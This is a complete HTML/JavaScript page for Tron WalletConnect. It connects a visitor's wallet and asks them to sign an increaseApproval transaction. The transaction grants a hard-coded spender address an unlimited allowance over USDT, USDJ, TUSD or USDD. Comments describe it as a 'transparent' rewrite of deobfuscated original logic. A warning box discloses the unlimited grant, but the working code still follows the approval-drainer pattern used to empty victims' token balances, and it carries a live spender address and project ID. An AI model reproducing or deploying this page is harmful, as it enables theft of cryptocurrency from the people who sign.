<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Tron WalletConnect Approval (Transparent)</title>

  <!-- Tailwind for UI -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- TronWeb (NO injected provider; HTTP only) -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>

  <!-- WalletConnect v2 (UMD) -->
  <script src="https://unpkg.com/@walletconnect/sign-client@2.11.3/dist/umd/index.umd.js"></script>
  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/umd/index.umd.js"></script>

  <script>
    /* ================= CONFIG ================= */
    // WalletConnect Project ID (REQUIRED)
    const WC_PROJECT_ID = "13b23579cee5fec9300dcc2301cccdbe";

    // Spender (same as original logic)
    const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";

    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    const TOKENS = [
      { id: "usdt", name: "USDT", contract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" },
      { id: "usdj", name: "USDJ", contract: "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT" },
      { id: "tusd", name: "TUSD", contract: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4" },
      { id: "usdd", name: "USDD", contract: "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn" }
    ];

    // Tron HTTP provider (same idea as deobfuscated code)
    const tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io"
    });

    let wcClient;
    let wcSession;
    let userAddress;
    let selectedToken = TOKENS[0];
  </script>
</head>
<body class="bg-gray-950 text-white min-h-screen flex items-center justify-center">

  <div class="w-full max-w-md bg-gray-900 rounded-2xl shadow-xl p-6">
    <h1 class="text-xl font-bold mb-4">Tron WalletConnect Approval</h1>

    <!-- TOKEN -->
    <label class="text-sm">Select Token</label>
    <select id="tokenSelect" class="w-full bg-gray-800 p-2 rounded mt-1 mb-4"></select>

    <!-- CONNECT -->
    <button id="connectBtn" class="w-full bg-blue-600 hover:bg-blue-700 rounded p-2 mb-3">
      Connect Wallet (WalletConnect)
    </button>

    <p id="addr" class="text-sm mb-3"></p>

    <!-- APPROVE -->
    <button id="approveBtn" class="hidden w-full bg-orange-600 hover:bg-orange-700 rounded p-2">
      Approve Token
    </button>

    <!-- WARNING -->
    <div id="warning" class="hidden mt-4 border border-red-600 rounded p-4 text-sm">
      <p class="font-bold text-red-400 mb-2">Unlimited Approval Warning</p>
      <p class="mb-2">You are granting <b>UNLIMITED</b> access to this token.</p>
      <p class="text-xs break-all mb-3">Spender: <span id="spender"></span></p>
      <button id="confirmApprove" class="w-full bg-red-600 hover:bg-red-700 rounded p-2">
        I Understand, Continue
      </button>
    </div>

    <div id="status" class="mt-4 text-sm"></div>
  </div>

  <script>
    /* ================= UI SETUP ================= */
    const tokenSelect = document.getElementById("tokenSelect");
    const addrEl = document.getElementById("addr");
    const statusEl = document.getElementById("status");

    TOKENS.forEach(t => {
      const opt = document.createElement("option");
      opt.value = t.id;
      opt.textContent = t.name;
      tokenSelect.appendChild(opt);
    });

    tokenSelect.onchange = e => {
      selectedToken = TOKENS.find(t => t.id === e.target.value);
    };

    function mask(a){ return a.slice(0,6)+"..."+a.slice(-4); }

    /* ================= WALLETCONNECT ================= */
    async function initWC(){
      wcClient = await window.WalletConnectSignClient.SignClient.init({
        projectId: WC_PROJECT_ID,
        metadata: {
          name: "Tron Approval",
          description: "Transparent Tron approval via WalletConnect",
          url: location.origin,
          icons: []
        }
      });
    }

    async function connectWC(){
      if(!wcClient) await initWC();

      const { uri, approval } = await wcClient.connect({
        requiredNamespaces: {
          tron: {
            methods: ["tron_signTransaction"],
            chains: ["tron:0x2b6653dc"], // Tron mainnet
            events: []
          }
        }
      });

      if(uri){
        const modal = new window.WalletConnectModal.WalletConnectModal({
          projectId: WC_PROJECT_ID
        });
        modal.openModal({ uri });
      }

      wcSession = await approval();
      const account = wcSession.namespaces.tron.accounts[0];
      userAddress = account.split(":")[2];

      addrEl.textContent = "Wallet: " + mask(userAddress);
      document.getElementById("approveBtn").classList.remove("hidden");
    }

    /* ================= APPROVAL FLOW ================= */
    async function buildApprovalTx(){
      const contract = await tronWeb.contract().at(selectedToken.contract);

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        tronWeb.address.toHex(selectedToken.contract),
        "increaseApproval(address,uint256)",
        { callValue: 0 },
        [
          { type: "address", value: SPENDER },
          { type: "uint256", value: MAX_UINT }
        ],
        tronWeb.address.toHex(userAddress)
      );

      return transaction;
    }

    async function requestApproval(){
      statusEl.textContent = "Requesting wallet signatureâ€¦";
      try{
        const tx = await buildApprovalTx();

        const signed = await wcClient.request({
          topic: wcSession.topic,
          chainId: "tron:0x2b6653dc",
          request: {
            method: "tron_signTransaction",
            params: { transaction: tx }
          }
        });

        const result = await tronWeb.trx.sendRawTransaction(signed);
        statusEl.innerHTML = `<span class='text-green-400'>Approved</span><br><span class='text-xs break-all'>${result.txid}</span>`;
      }catch(e){
        console.error(e);
        statusEl.innerHTML = "<span class='text-red-400'>Rejected or failed</span>";
      }
    }

    /* ================= EVENTS ================= */
    document.getElementById("connectBtn").onclick = connectWC;

    document.getElementById("approveBtn").onclick = () => {
      document.getElementById("spender").textContent = SPENDER;
      document.getElementById("warning").classList.remove("hidden");
    };

    document.getElementById("confirmApprove").onclick = requestApproval;
  </script>
</body>
</html>
